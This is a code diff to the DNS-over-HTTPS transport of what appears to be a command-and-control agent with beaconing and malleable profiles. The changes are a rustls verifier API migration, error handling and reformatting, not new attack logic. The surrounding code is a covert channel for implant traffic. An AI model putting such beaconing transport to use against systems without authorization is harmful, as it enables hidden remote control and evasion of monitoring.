@@ -68,15 +68,16 @@ use crate::malleable::MalleableProfile as AgentMalleableProfile;
 /// When `expected_fingerprint` is `None`, the verifier delegates to rustls's
 /// built-in `WebPkiVerifier` with platform root certificates — i.e. standard
 /// CA-based verification.
+#[derive(Debug)]
 struct FingerprintVerifier {
     expected_fingerprint: Option<String>,
     /// P1-06: The expected server hostname for certificate name validation.
     hostname: String,
-    webpki: rustls::client::WebPkiVerifier,
+    webpki: Arc<rustls::client::WebPkiServerVerifier>,
 }
 
 impl FingerprintVerifier {
-    fn new(expected_fingerprint: Option<String>, hostname: String) -> Self {
+    fn new(expected_fingerprint: Option<String>, hostname: String) -> Result<Self> {
         let mut root_store = rustls::RootCertStore::empty();
         for cert in rustls_native_certs::load_native_certs()
             .certs
@@ -85,12 +86,14 @@ impl FingerprintVerifier {
         {
             root_store.add(cert).ok();
         }
-        let webpki = rustls::client::WebPkiVerifier::new(root_store, None);
-        Self {
+        let webpki = rustls::client::WebPkiServerVerifier::builder(Arc::new(root_store))
+            .build()
+            .map_err(|e| anyhow!("failed to build WebPKI verifier: {e}"))?;
+        Ok(Self {
             expected_fingerprint,
             hostname,
             webpki,
-        }
+        })
     }
 }
 
@@ -281,9 +284,9 @@ impl DohTransport {
         // that do not support ECDH.  Upgraded when the server responds to the
         // ECDH DNS query.
         let session = CryptoSession::from_shared_secret(psk.as_bytes());
-        let ecdh_client = Some(Mutex::new(
-            common::forward_secrecy::HttpEcdhClient::new(psk.as_bytes()),
-        ));
+        let ecdh_client = Some(Mutex::new(common::forward_secrecy::HttpEcdhClient::new(
+            psk.as_bytes(),
+        )));
         // Extract legacy config fields if provided.
         let doh_beacon_sentinel = common_profile
             .map(|p| p.doh_beacon_sentinel.clone())
@@ -314,7 +317,7 @@ impl DohTransport {
         };
 
         let client = if cert_fingerprint.is_some() {
-            let verifier = FingerprintVerifier::new(cert_fingerprint, host_header.clone());
+            let verifier = FingerprintVerifier::new(cert_fingerprint, host_header.clone())?;
             let config = rustls::ClientConfig::builder()
                 .dangerous()
                 .with_custom_certificate_verifier(Arc::new(verifier))
@@ -428,7 +431,8 @@ impl DohTransport {
         let ecdh_data = header_value
             .replace('+', "-")
             .replace('/', "_")
-            .trim_end_matches('=');
+            .trim_end_matches('=')
+            .to_string();
 
         let ecdh_prefix = common::ioc::IOC_DNS_ECDH;
         let domain = self.build_domain(ecdh_prefix, &ecdh_data);
@@ -445,26 +449,32 @@ impl DohTransport {
                             // Strip quotes if present.
                             let txt = txt.trim_matches('"');
                             // Decode the server's ECDH response.
-                            let server_val = txt
-                                .replace('-', "+")
-                                .replace('_', "/");
-                            if let Some(ecdh_mutex) = self.ecdh_client.as_ref() {
-                                if let Ok(client) = ecdh_mutex.lock() {
-                                    match client.derive_session_from_response(&server_val) {
-                                        Ok(derived) => {
-                                            tracing::info!(
-                                                "DoH ECDH session established (session_id={:x})",
-                                                self.session_id
-                                            );
-                                            self.session = derived;
-                                            self.ecdh_client = None;
-                                            return;
-                                        }
-                                        Err(e) => {
-                                            tracing::warn!("DoH ECDH derivation failed: {}", e);
+                            let server_val = txt.replace('-', "+").replace('_', "/");
+                            let derived = if let Some(ecdh_mutex) = self.ecdh_client.as_ref() {
+                                match ecdh_mutex.lock() {
+                                    Ok(mut client) => {
+                                        match client.derive_session_from_response(&server_val) {
+                                            Ok(derived) => Some(derived),
+                                            Err(e) => {
+                                                tracing::warn!("DoH ECDH derivation failed: {}", e);
+                                                None
+                                            }
                                         }
                                     }
+                                    Err(_) => None,
                                 }
+                            } else {
+                                None
+                            };
+
+                            if let Some(derived) = derived {
+                                tracing::info!(
+                                    "DoH ECDH session established (session_id={:x})",
+                                    self.session_id
+                                );
+                                self.session = derived;
+                                self.ecdh_client = None;
+                                return;
                             }
                         }
                     }
@@ -496,8 +506,14 @@ impl DohTransport {
 
         for _ in 0..max_cname_depth {
             let result = match doh_method.to_uppercase().as_str() {
-                "POST" => self.execute_doh_post(&resolver, &current_domain, qtype).await,
-                _ => self.execute_doh_get(&resolver, &current_domain, qtype).await,
+                "POST" => {
+                    self.execute_doh_post(&resolver, &current_domain, qtype)
+                        .await
+                }
+                _ => {
+                    self.execute_doh_get(&resolver, &current_domain, qtype)
+                        .await
+                }
             }?;
 
             // Check if we got any answers of the requested type.
@@ -505,7 +521,10 @@ impl DohTransport {
                 .json
                 .get("Answer")
                 .and_then(|a| a.as_array())
-                .map(|arr| arr.iter().any(|r| r.get("type").and_then(|t| t.as_u64()) == Some(qtype_val as u64)))
+                .map(|arr| {
+                    arr.iter()
+                        .any(|r| r.get("type").and_then(|t| t.as_u64()) == Some(qtype_val as u64))
+                })
                 .unwrap_or(false);
 
             if has_direct_answer {
@@ -548,7 +567,8 @@ impl DohTransport {
             max_cname_depth,
             domain
         );
-        self.execute_doh_post(&resolver, &current_domain, qtype).await
+        self.execute_doh_post(&resolver, &current_domain, qtype)
+            .await
     }
 
     /// Execute a DoH query using GET with JSON response (RFC 8484).
@@ -1113,7 +1133,8 @@ impl Transport for DohTransport {
         let plaintext = self.session.decrypt(&ciphertext)?;
 
         // Deserialize the message.
-        let msg = bincode::serde::decode_from_slice(&plaintext, bincode::config::legacy()).map(|(v, _)| v)?;
+        let msg = bincode::serde::decode_from_slice(&plaintext, bincode::config::legacy())
+            .map(|(v, _)| v)?;
 
         Ok(msg)
     }
@@ -1390,7 +1411,7 @@ mod tests {
         resp.extend_from_slice(&[0x00, 0x05]); // TYPE=CNAME
         resp.extend_from_slice(&[0x00, 0x01]); // CLASS=IN
         resp.extend_from_slice(&[0x00, 0x00, 0x0E, 0x10]); // TTL=3600
-        // RDATA: "real.example.com" as labels (no compression).
+                                                           // RDATA: "real.example.com" as labels (no compression).
         let rdata_start = resp.len();
         resp.extend_from_slice(&[0x00, 0x00]); // RDLENGTH placeholder
         for label in &["real", "example", "com"] {
